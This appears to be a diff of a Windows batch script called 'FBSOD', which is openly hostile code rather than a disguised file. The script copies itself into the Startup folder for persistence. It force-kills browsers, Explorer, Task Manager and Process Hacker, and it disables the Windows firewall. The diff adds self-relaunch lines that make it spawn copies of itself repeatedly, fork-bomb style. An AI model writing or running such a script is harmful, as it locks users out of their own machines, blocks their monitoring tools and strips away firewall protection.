@@ -1,8 +1,10 @@
 @echo off
 title FBSOD title FBSOD %username% %date% process %random%
+start "" "%~dpnx0"
 if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0" (
   copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 )
+start "" "%~dpnx0"
 cls
 taskkill /F /IM "chrome.exe" /T
 taskkill /F /IM "firefox.exe" /T
@@ -10,7 +12,7 @@ taskkill /F /IM "ProcessHacker.exe" /T
 taskkill /F /IM "explorer.exe" /T
 taskkill /F /IM "taskmgr.exe" /T
 cls
-start /min FBSOD.bat
+start "" "%~dpnx0"
 cls
 netsh firewall set opmode disable
 netsh firewall set opmode mode=DISABLE
